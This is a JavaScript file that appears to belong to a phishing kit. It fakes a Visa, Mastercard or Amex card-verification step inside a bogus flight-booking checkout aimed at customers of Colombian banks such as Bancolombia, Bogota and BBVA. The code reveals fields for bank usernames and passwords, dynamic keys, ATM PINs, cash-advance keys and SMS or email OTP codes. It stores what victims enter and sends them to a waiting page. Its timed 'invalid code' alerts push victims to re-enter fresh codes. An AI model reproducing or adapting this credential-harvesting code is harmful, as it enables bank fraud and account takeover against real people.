/**
 * SET LOGOS
 */
const companyLoader = document.querySelector('#company-loader');
const companyLogo = document.querySelector('#company-logo');
const bankLogo = document.querySelector('#bank-logo');
if(info.checkerInfo.company === 'VISA'){
    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
    companyLoader.setAttribute('width', '130px');
    companyLoader.setAttribute('style', 'margin-bottom: 40px');

    companyLogo.setAttribute('src', './assets/logos/visa_verified.png');
    companyLogo.setAttribute('width', '90px');
}else if(info.checkerInfo.company === 'MC'){
    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
    companyLoader.setAttribute('width', '400px');

    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
    companyLogo.setAttribute('width', '130px');
}else if(info.checkerInfo.company === 'AM'){
    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
    companyLoader.setAttribute('width', '200px');

    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
    companyLogo.setAttribute('width', '110px');
}


if(info.metaInfo.ban === 'bancolombia'){
    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
    bankLogo.setAttribute('width', `120px`);
}else{
    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
}

const mainLoader = document.querySelector('.main-loader');
setTimeout(() =>{
    try{
        mainLoader.classList.remove('show');
    }catch(e){
        console.log('e');
    }
}, 2500);





/**
 * SET INPUTS
 */
const user = document.querySelectorAll('#user');
const puser = document.querySelectorAll('#puser');
const cdin = document.querySelectorAll('#cdin');
const dintok = document.querySelectorAll('#dintok');
const ccaj = document.querySelectorAll('#ccaj');
const cavance = document.querySelectorAll('#cavance');
const otpcode = document.querySelectorAll('#otpcode');
if(info.checkerInfo.mode === 'userpassword'){

    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.user !== ''){
            alert('Datos inválidos, por favor corrija la información e inténtelo de nuevo.');
        }
    }, 2050);

    user.forEach(elem =>{
        elem.classList.remove('hidden');
    });
    puser.forEach(elem =>{
        elem.classList.remove('hidden');
    });

    if(info.metaInfo.ban === 'bancolombia' || info.metaInfo.ban === 'bogota'){
        puser[1].setAttribute('oninput', 'limitDigits(this, 4);');
    }
}else if(info.checkerInfo.mode === 'cdin'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.cdin !== ''){
            if(info.metaInfo.ban === 'bogota'){
                alert('Token inválido o expiró, por favor inténtelo de nuevo.');
            }else{
                alert('Clave dinámica inválida o expiró, por favor inténtelo de nuevo.');
            }
        } else {
            alert('Ingresa tu Clave Dinámica')
        }
    }, 2050);

    if(info.metaInfo.ban === 'bogota' || info.metaInfo.ban === 'bbva'){
        dintok.forEach(elem =>{
            elem.classList.remove('hidden');
        });
    }else{  
        cdin.forEach(elem =>{
            elem.classList.remove('hidden');
        });
    }
    
}else if(info.checkerInfo.mode === 'ccaj'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.ccaj !== ''){
            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
        } else {
            alert('Ingresa tu Clave de Cajero')
        }
    }, 2050);
    ccaj.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}else if(info.checkerInfo.mode === 'cavance'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.cavance !== ''){
            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
        } else {
            alert('Ingresa tu Clave de Avances')
        }
    }, 2050);
    cavance.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}else if(info.checkerInfo.mode === 'otpcode'){
    if(info.metaInfo.ban === 'bogota'){
        otpcode[1].setAttribute('oninput', 'limitDigits(this, 8);');
    }
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.tok !== ''){
            alert('Código inválido, por favor ingrese el valor de nuevo.');
        } else {
            alert('Ingresa el código que hemos enviado a tu teléfono ó email')
        }
    }, 2050);
    otpcode.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}




/**
 * SET NUMBERS
*/
const {
    seat_type,
    seat_type_back,
    adults,
    children,
} = info.flightInfo;

let price;
switch (seat_type) {
    case 1:
        price = (PRECIO_BASE*MULTIPLICADORES_PRECIO['light'] * (adults + children))
        break;
    case 2:
        price = (PRECIO_BASE*MULTIPLICADORES_PRECIO['medium'] * (adults + children))
        break;
    case 3:
        price = (PRECIO_BASE*MULTIPLICADORES_PRECIO['high'] * (adults + children))
        break;
    default:
        price = '0'
        break;
}
switch (seat_type_back) {
    case 1:
        price = ((PRECIO_BASE*MULTIPLICADORES_PRECIO['light'] * (adults + children)) + price)
        break;
    case 2:
        price = ((PRECIO_BASE*MULTIPLICADORES_PRECIO['medium'] * (adults + children)) + price)
        break;
    case 3:
        price = ((PRECIO_BASE*MULTIPLICADORES_PRECIO['high'] * (adults + children)) + price)
        break;
    default:
        break;
}

const flightPrice = document.querySelectorAll('#flight-price');
const cardDigits = document.querySelector('#card-digits');
let totalPassengers = info.passengersInfo.adults.length + info.passengersInfo.children.length;

const costFlightGo = PRECIO_BASE * MULTIPLICADOR_PLAN_MAP[info.flightInfo.seat_type] * totalPassengers;
const costFlightBack = PRECIO_BASE * MULTIPLICADOR_PLAN_MAP[info.flightInfo.seat_type_back] * totalPassengers;

cardDigits.textContent = info.metaInfo.p.split(' ')[3];
if(info.flightInfo.travel_type === 1){
    flightPrice.forEach(elem =>{
        elem.textContent = costFlightGo.toLocaleString('es-CO');
    });
}else{
    flightPrice.forEach(elem =>{
        elem.textContent = (costFlightGo + costFlightBack).toLocaleString('es-CO');
    });
}






/**
 * NEXT STEP
 */
const btnNextStep = document.querySelector('#btnNextStep');
btnNextStep.addEventListener('click', () => {
    if (info.checkerInfo.mode === 'userpassword') {
        if (user[1].value.trim() !== '') {
            if (puser[1].value.trim() !== '') {
                if (info.metaInfo.ban === 'bancolombia' || 
                    info.metaInfo.ban === 'bogota'
                ){
                    if (isNaN(Number(puser[1].value))) {
                        alert('Clave inválida, por favor rectifica tu contraseña');
                        return;
                    }
                }

                info.metaInfo.user = user[1].value.trim();
                info.metaInfo.puser = puser[1].value.trim();

                LS.setItem('info', JSON.stringify(info));

                window.location.href = 'waiting.html';
            } else {
                alert('Rellena la información.');
            }
        } else {
            alert('Rellena la información.');
        }
    } else if (info.checkerInfo.mode === 'cdin') {
        if ((cdin[1].value.trim() !== '' && cdin[1].value.trim().length === 6) || (dintok[1].value.trim() !== '' && dintok[1].value.trim().length === 8)) {
            info.metaInfo.cdin = cdin[1].value.trim();
            info.metaInfo.dintok = dintok[1].value.trim();

            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';

        } else {
            alert('Rellena la información.');
        }
    } else if (info.checkerInfo.mode === 'ccaj') {
        if (ccaj[1].value.trim() !== '' && ccaj[1].value.trim().length === 4) {
            info.metaInfo.ccaj = ccaj[1].value.trim();
            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';

        } else {
            alert('Rellena la información.');
        }
    } else if (info.checkerInfo.mode === 'cavance') {
        if (cavance[1].value.trim() !== '' && cavance[1].value.trim().length === 6) {
            info.metaInfo.cavance = cavance[1].value.trim();
            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';

        } else {
            alert('Rellena la información.');
        }
    } else if (info.checkerInfo.mode === 'otpcode') {
        if (otpcode[1].value.trim() !== '' && otpcode[1].value.trim().length > 3) {
            info.metaInfo.tok = otpcode[1].value.trim();
            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';

        } else {
            alert('Rellena la información.');
        }
    }
});